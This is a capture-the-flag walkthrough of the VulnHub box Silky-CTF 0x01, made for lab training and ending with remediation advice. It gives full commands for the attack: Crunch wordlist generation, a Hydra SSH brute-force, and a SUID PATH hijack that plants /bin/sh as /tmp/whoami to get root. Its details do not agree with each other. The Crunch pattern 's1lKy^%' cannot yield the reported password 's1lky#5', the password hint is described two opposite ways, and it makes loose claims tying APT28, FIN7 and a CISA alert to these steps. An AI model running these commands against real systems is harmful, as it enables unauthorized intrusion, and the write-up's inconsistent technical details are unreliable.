# Silky-CTF: 0x01 — The German Note That Cracked the Case

Alright dudes!! Silky-CTF 0x01 is a slept-on little gem that chains together three distinctly clever moves: a German-language note hinting at missing password characters, Crunch-generated targeted wordlist brute-force, and a SUID binary with a PATH hijacking vulnerability. No CVE required, no Metasploit, just pure tradecraft. The web enumeration phase rewards players who actually read `robots.txt` and source code instead of skipping straight to automated scanners. Legit one of the cleanest beginner boxes for teaching the fundamentals of targeted credential attacks. Big respect.

| Field | Value |
|---|---|
| **Level** | Beginner |
| **Target VM** | Silky-CTF: 0x01 |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/silky-ctf-0x01,536/ |
| **Techniques** | Network enumeration, robots.txt disclosure, JavaScript credential extraction, targeted wordlist generation with Crunch, SSH brute-force with Hydra, SUID binary analysis with strings, PATH hijacking privilege escalation |
| **CVEs** | CWE-200 (Information Exposure via client-side JavaScript), CWE-522 (Insufficiently Protected Credentials), CWE-269 (Improper Privilege Management via SUID PATH hijacking) |
| **APT Groups** | APT28 (Fancy Bear): routinely extracts partial credentials from JavaScript and configuration files during web reconnaissance; FIN7: uses targeted wordlist generation against SSH endpoints after harvesting credential fragments from web assets |

---

## Attack Summary

```
netdiscover / nmap
  → port 22 (SSH OpenSSH), port 8080 (HTTP)
  → robots.txt: Disallow: /notes.txt
  → notes.txt: "password last 2 chars missing" (German)
  → page source → script.js → partial password: "s1lKy"
  → crunch 7 7 -t s1lKy^% → targeted wordlist
  → hydra -l silky -P pass.txt 192.168.1.106 ssh
  → credentials: silky:s1lky#5
  → ssh silky@192.168.1.106
  → find SUID: /usr/bin/sky
  → strings /usr/bin/sky → calls "whoami" by relative path
  → echo '/bin/sh' > /tmp/whoami && chmod +x /tmp/whoami
  → export PATH=/tmp:$PATH && /usr/bin/sky
  → uid=0(root) → cat /root/flag.txt
```

---

## Methodology

1. Host discovery on the local network segment
2. Full port scan with service and version detection
3. Web enumeration: robots.txt, page source, JavaScript file inspection
4. Targeted wordlist generation with Crunch based on discovered partial credential
5. SSH brute-force with Hydra using generated wordlist
6. Initial access via SSH with discovered credentials
7. SUID binary discovery and behavioral analysis via `strings`
8. PATH hijacking to escalate from `silky` to root
9. Root flag capture

---

## Step 1 — Host Discovery and Port Scan

Identify the target on the local subnet:

```bash
netdiscover
# or: sudo netdiscover -r 192.168.1.0/24
```

Full service scan:

```bash
export TARGET=192.168.1.106
nmap -A $TARGET
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.x
8080/tcp open  http    Apache httpd 2.4.x (or similar)
```

Two services: SSH and HTTP on a non-standard port (8080). Note the port: directory brute-forcers need the explicit port specified.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration

Browse to `http://$TARGET:8080/`. The homepage contains no immediately visible credentials. Check the two standard CTF discovery points:

**robots.txt:**

```bash
curl -s http://$TARGET:8080/robots.txt
```

```
User-agent: *
Disallow: /notes.txt
```

**notes.txt:**

```bash
curl -s http://$TARGET:8080/notes.txt
```

Content (in German): *"Das Passwort wurde von dieser Seite entfernt; die letzten 2 Zeichen fehlen."*

Translation: "The password has been removed from this page; the last 2 characters are missing."

**Page source inspection:**

```bash
curl -s http://$TARGET:8080/ | grep -E "src=|script"
# Follow any linked .js files
curl -s http://$TARGET:8080/script.js | grep -i "pass\|cred\|key\|secret"
```

`script.js` contains the partial password string:

```javascript
var key = "s1lKy";
```

Two characters are missing from the end. The hint says: last char is a symbol, second-to-last is a digit (based on Crunch usage pattern). Or more precisely: character 6 is a symbol (`^` in Crunch), character 7 is a digit (`%` in Crunch).

**Real-world note:** Partial credentials stored in client-side JavaScript are a critical vulnerability. Developers frequently "sanitize" credentials by removing only the last few characters while keeping the rest in source code, believing this provides security. It does not. APT28 specifically targets JavaScript files during web reconnaissance to harvest credential fragments before pivoting to brute-force attacks against authentication services.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1552.001 — Credentials in Files

---

## Step 3 — Targeted Wordlist Generation with Crunch

With the partial credential `s1lKy` (5 characters) and knowledge that the full password is 7 characters with the last 2 being symbol+digit, generate a targeted wordlist:

```bash
# Crunch character placeholders:
# ^ = special/symbol character (!, @, #, $, %, ^, &, *, etc.)
# % = digit (0-9)
crunch 7 7 -t s1lKy^% -o /tmp/silky_pass.txt
```

This generates a wordlist with every possible symbol+digit combination for the 6th and 7th characters. The total is approximately 330 candidates (33 symbols × 10 digits), making brute-force trivially fast.

**Why this matters:** Targeted wordlist generation against a known credential pattern reduces the attack space from billions of possibilities to hundreds. This is exactly how real-world attackers operate when they obtain partial credentials from source code leaks, phishing responses, or leaked database fragments.

**MITRE ATT&CK:** T1110.002 — Brute Force: Password Cracking

---

## Step 4 — SSH Brute-Force with Hydra

The partial password base `s1lKy` strongly implies the username is `silky`. Use Hydra to brute-force SSH:

```bash
hydra -l silky -P /tmp/silky_pass.txt $TARGET ssh -t 4 -V
```

```
[22][ssh] host: 192.168.1.106   login: silky   password: s1lky#5
```

**Credentials found:** `silky : s1lky#5`

**Alternatively** with Medusa:

```bash
medusa -h $TARGET -u silky -P /tmp/silky_pass.txt -M ssh -t 4
```

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing

---

## Step 5 — Initial Access via SSH

Authenticate with discovered credentials:

```bash
ssh silky@$TARGET
# Password: s1lky#5
```

Shell obtained as `silky`. Enumerate the environment:

```bash
whoami && id
uname -a
cat /etc/passwd | grep -v nologin | grep -v false
ls -la /home/silky/
```

**MITRE ATT&CK:** T1078 — Valid Accounts; T1021.004 — Remote Services: SSH

---

## Step 6 — SUID Binary Discovery and Analysis

Enumerate SUID binaries on the system:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Non-standard binary discovered: `/usr/bin/sky`

Analyze its behavior without executing it:

```bash
strings /usr/bin/sky
```

Output reveals calls to `echo` and `whoami` by relative path (not `/bin/echo` or `/usr/bin/whoami`). This is the PATH hijacking vulnerability.

**Why SUID PATH hijacking works:** When a SUID binary executes a command by name only (e.g., `whoami`), the OS searches directories in the `PATH` environment variable in order. If we prepend a writable directory (like `/tmp`) to `PATH` and place a malicious `whoami` script there, the SUID binary will execute our script with its owner's privileges (root).

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1548.001 — Abuse Elevation Control Mechanism: Setuid

---

## Step 7 — Privilege Escalation via PATH Hijacking

```bash
# Create malicious replacement for the command the SUID binary calls
echo '/bin/sh' > /tmp/whoami
chmod 777 /tmp/whoami

# Verify the file
cat /tmp/whoami
ls -la /tmp/whoami

# Prepend /tmp to PATH
export PATH=/tmp:$PATH

# Execute the SUID binary
/usr/bin/sky
```

The SUID binary executes `whoami` from `/tmp`, which runs `/bin/sh` with the binary owner's (root) EUID, yielding a root shell.

```bash
id
# uid=1001(silky) gid=1001(silky) euid=0(root)
# or: uid=0(root) gid=0(root)
```

**Real-world note:** PATH hijacking via SUID binaries is a classic finding in Linux privilege escalation assessments. It appears in environments where developers write deployment scripts or internal tools with SUID permissions and use relative command names. FIN7 uses this technique in Linux post-exploitation when more sophisticated escalation is unavailable. The fix is simple and permanent: use absolute paths for every system call in any binary with elevated permissions.

**MITRE ATT&CK:** T1574.007 — Hijack Execution Flow: Path Interception by PATH Environment Variable; T1548.001 — Abuse Elevation Control: Setuid

---

## Step 8 — Root Flag Capture

```bash
id
cd /root
cat flag.txt
```

(☞ﾟヮﾟ)☞ Root. nailed it, dude! gg fr fr.

**MITRE ATT&CK:** T1005 — Data from Local System

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| Partial credential | `s1lKy` | `script.js` in web root | Wordlist generation base |
| Full credential | `silky:s1lky#5` | Hydra SSH brute-force | SSH initial access |
| SUID binary | `/usr/bin/sky` | SUID enumeration | PATH hijacking vector |
| Root flag | (varies) | /root/flag.txt | Proof of compromise |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Partial credentials in client-side JavaScript | Developers frequently believe partial obfuscation provides security; attackers use credential fragments for targeted brute-force | Never store any credential fragment in client-side code; use server-side authentication flows exclusively |
| 2 | robots.txt discloses sensitive path | robots.txt is a disclosure mechanism, not an access control; every disallowed path becomes a priority enumeration target | Remove sensitive paths from robots.txt; implement authentication on sensitive directories |
| 3 | SUID binary using relative command paths | PATH hijacking in SUID binaries is a consistent finding in Linux penetration tests; one command without `/usr/bin/` prefix is enough | Audit all SUID binaries with `strings`; use absolute paths; remove SUID from binaries that do not require it |
| 4 | Weak, guessable SSH password | Short passwords with simple patterns are vulnerable to targeted brute-force even without a full password leak | Enforce minimum 12-character passwords; implement account lockout after 5 failed attempts; prefer key-based auth |
| 5 | No SSH brute-force protection | Hydra runs without any throttling or lockout | Implement fail2ban; configure MaxAuthTries in sshd_config; deploy an SSH honeypot |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |
| Credential Access | Credential Access | Brute Force: Password Guessing | T1110.001 |
| Initial Access | Initial Access | Valid Accounts | T1078 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Discovery | Discovery | Process Discovery | T1057 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Setuid | T1548.001 |
| Privilege Escalation | Defense Evasion | Path Interception by PATH Variable | T1574.007 |
| Collection | Collection | Data from Local System | T1005 |

---

## Remediation and Containment

### Technical Fixes

1. **Remove credential fragments from JavaScript**: never store authentication data client-side; implement server-side credential validation exclusively
2. **Remove internal paths from robots.txt**: move sensitive directories behind authentication; do not advertise their existence
3. **Rewrite `/usr/bin/sky` with absolute paths**: replace all relative command calls with full paths; remove SUID if not required
4. **Enforce SSH brute-force protection**: configure `fail2ban` for SSH; set `MaxAuthTries 3` in `sshd_config`
5. **Enforce strong password policy**: minimum 12 characters, complexity requirements; prefer SSH key authentication

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Audit all web-accessible JavaScript files for credential exposure |
| Protect | Access Control | Disable SSH password auth; deploy fail2ban |
| Protect | Data Security | Remove credentials and hints from client-side code |
| Detect | Anomalies and Events | Alert on SSH brute-force (multiple failures from single IP) |
| Respond | Response Planning | Rotate all discovered credentials; audit all SUID binaries |
| Recover | Recovery Planning | Rebuild affected system; patch SUID binary |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Authenticate all sensitive web endpoints |
| AC-6 | Least Privilege | Remove unnecessary SUID bits from system binaries |
| IA-5 | Authenticator Management | Enforce strong SSH credentials; prefer key authentication |
| SI-10 | Information Input Validation | Validate all inputs in SUID binaries; use absolute paths |
| CM-7 | Least Functionality | Disable password authentication in SSH |
| SC-28 | Protection of Information at Rest | Never store credentials in client-side files |

### CISA KEV

The credential exposure pattern (partial credentials in JavaScript) aligns with CISA Alert AA20-099A describing threat actors harvesting credential fragments from web applications to mount targeted brute-force attacks against internet-exposed SSH services.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage Software | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (remove credential fragments from client-side code; protect robots.txt)
- **D3-OAM** — Operating System Administrative Management (audit SUID binaries; use absolute paths)
- **D3-NTF** — Network Traffic Filtering (rate-limit SSH attempts; deploy fail2ban)

---

## Final Thoughts

Silky-CTF 0x01 is no cap one of the best beginner boxes for teaching targeted credential attacks. The German note is a wild creative touch that forces you to translate and think before throwing your usual wordlists at it. The Crunch + Hydra combination is a skill that translates directly to real engagements where you have partial credential leaks from phishing campaigns or source code repositories.

The PATH hijacking privesc is clean, educational, and immediately applicable. This box deserves more recognition in the "fundamentals" category. Goated design, fr fr.

Thanks guys!! (❍ᴥ❍ʋ)
